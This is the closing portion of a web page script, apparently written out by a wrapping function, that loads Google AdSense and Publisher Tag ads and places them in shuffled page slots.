    <script>
        function shuffle(array) {
            const a = array.slice();
            for (let i = a.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [a[i], a[j]] = [a[j], a[i]];
            }
            return a;
        }

        function loadScriptOnce(url, options = {}) {
            return new Promise((resolve, reject) => {
                if (document.querySelector(\`script[src="\${url}"]\`)) {
                    resolve();
                    return;
                }
                const s = document.createElement('script');
                s.src = url;
                s.async = options.async !== false;
                if (options.crossorigin) s.crossOrigin = options.crossorigin;
                s.onload = resolve;
                s.onerror = () => reject(new Error(\`Failed to load script: \${url}\`));
                document.body.appendChild(s);
            });
        }
        async function loadAdSenseScript() {
            const url = \`https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-\${adSenseClientId}\`;
            await loadScriptOnce(url, {
                async: true,
                crossorigin: 'anonymous'
            });
        }

        function createAdSenseIns(divId, adSlot) {
            const targetEl = document.getElementById(divId);
            if (!targetEl) return;
            const ins = document.createElement('ins');
            ins.className = 'adsbygoogle';
            ins.style.display = 'block';
            ins.setAttribute('data-ad-client', \`ca-pub-\${adSenseClientId}\`);
            ins.setAttribute('data-ad-slot', adSlot);
            ins.setAttribute('data-ad-format', 'auto');
            ins.setAttribute('data-full-width-responsive', 'true');
            targetEl.appendChild(ins);
            (adsbygoogle = window.adsbygoogle || []).push({});
        }

        async function loadGPTScript() {
            await loadScriptOnce("https://securepubads.g.doubleclick.net/tag/js/gpt.js", {
                async: true,
                crossorigin: 'anonymous'
            });
            window.googletag = window.googletag || { cmd: [] };
        }

        function createGPTUnit(divId, unit) {
            if (!document.getElementById(divId)) return;
            googletag.cmd.push(function() {
                const sizesShuffled = shuffle(unit.sizes);
                googletag.defineSlot(unit.path, sizesShuffled, divId).addService(googletag.pubads());
                googletag.pubads().enableSingleRequest();
                googletag.enableServices();
                googletag.display(divId);
            });
        }

        async function initAds(type = 'both') {
            const tasks = [];
            if (type === 'adsense' || type === 'both') tasks.push(loadAdSenseScript());
            if (type === 'gpt' || type === 'both') tasks.push(loadGPTScript());
            await Promise.all(tasks);
            var divsShuffled = divIds;
            if (sessionStorage.getItem("adclk") == 1) {
                divsShuffled = divIdsIn;
            }
            let adCodes = [];
            if (type === 'adsense') {
                const slotsShuffled = shuffle(adSenseSlots).slice(0, divIds.length);
                adCodes = slotsShuffled.map(slot => ({
                    type: 'adsense',
                    adSlot: slot
                }));
            } else if (type === 'gpt') {
                const unitsShuffled = shuffle(gptUnits).slice(0, divIds.length);
                adCodes = unitsShuffled.map(unit => ({
                    type: 'gpt',
                    unit
                }));
            } else if (type === 'both') {
                const numAdsense = Math.floor(divIds.length / 2);
                const numGPT = divIds.length - numAdsense;
                const slotsShuffled = shuffle(adSenseSlots).slice(0, numAdsense);
                const unitsShuffled = shuffle(gptUnits).slice(0, numGPT);
                adCodes = [...slotsShuffled.map(slot => ({
                    type: 'adsense',
                    adSlot: slot
                })), ...unitsShuffled.map(unit => ({
                    type: 'gpt',
                    unit
                }))];
            }
            const finalAdCodes = shuffle(adCodes);
            for (let i = 0; i < divsShuffled.length; i++) {
                const divId = divsShuffled[i];
                const code = finalAdCodes[i];
                if (!code || !document.getElementById(divId)) continue;
                if (code.type === 'adsense') createAdSenseIns(divId, code.adSlot);
                else if (code.type === 'gpt') createGPTUnit(divId, code.unit);
            }
        }

        async function initAll() {
            if (!wpPosts || wpPosts.length === 0) {
                await fetchWpPosts();
            }
            await initAds(jye_adtype);
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", initAll);
        } else {
            initAll();
        }
    </script>
</body>
</html>`);
    }
})();
